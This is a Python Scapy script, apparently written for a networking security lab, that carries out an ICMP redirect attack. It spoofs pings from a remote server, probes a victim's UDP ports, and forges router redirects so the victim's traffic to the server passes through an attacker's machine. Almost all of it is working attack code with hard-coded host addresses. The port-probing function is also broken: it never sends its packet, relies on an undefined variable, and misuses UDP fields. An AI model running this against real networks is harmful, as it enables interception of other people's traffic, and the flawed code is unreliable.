# Python script to send packets using Scapy
# THIS WAS MADE AND USED FOR EDUCATIONAL PURPOSES ONLY

# Author: Lucas Frink

# Notes:
# - This script depends on the Scapy module.
from scapy.all import *
import time

# The IP address of the attacker machine.
attacker = '192.168.50.138'
# The IP address of the victim machine.
victim = '192.168.50.91'
# The IP address of the target remote server.
server = '129.21.1.40'
# The IP address of the router.
router = '192.168.50.1'

# This function crafts a false ICMP Echo Message from the target server to the victim machine.
# This packet tricks the victim into creating a routing entry for the target server.
def fakePing():
	# IP header.
	pingReq = IP()
	# The victim believes the request is from the target server.
	pingReq.src = server
	pingReq.dst = victim
	icmp = ICMP()
	# Type 8 indicates an Echo Request.
	icmp.type=8
	icmp.code=0
	send(pingReq/icmp, count =4)

# This function crafts a UDP datagram in order to probe for open UDP ports on the victim.
# An open UDP port should not respond with an ICMP error message.
def portProbing():
	# Commonly open UDP ports on Linux.
	udpPorts = [1234,53,5353,68,681,3887,43800,161,162,67]
	port = 0
	for i in udpPorts:
		port = i
		ip = IP()
		ip.src = attacker
		ip.dst = victim
		udp = UDP()
		udp.src = attacker
		udp.dst = victim
		udp.dport = i
		# Looking at the response to the probe; typically a open port responds with nothing.
		if ans == None:
			break
		else:
			continue
	return port
	
# This function crafts a ICMP Redirect Message to trick the victim into believing the next hop 
# to the target server is through the attacker machine.
# The data section of the ICMP header contains a false, yet potentially valid UDP datagram. Upon 
# validation, the victim checks the data section and determines the redirect to be valid. 
def interPhase():
	# The IP header spoofs the router.
	ip1 = IP()
	ip1.src = router
	ip1.dst = victim
	icmp = ICMP()
	# The best next hop is the attacker.
	icmp.gw = attacker
	# Type 5 indicates a Redirect Message.
	# Code 1 indicates a Redirect Datagram for the Host.
	icmp.type=5
	icmp.code=1
	# The data field is embedded with a false UDP datagram.
	ip2 = IP()
	ip2.src = victim
	ip2.dst = server
	udp = UDP()
	udp.src = victim
	udp.dst = server
	# Port previously probed, determined to be open.
	udp.sport = 5353
	send(ip1/icmp/ip2/udp, count = 10)


# The main function sends all packets in succession.
def main():
	fakePing()
	portProbing()
	interPhase()
	
if __name__ == '__main__':
    main()
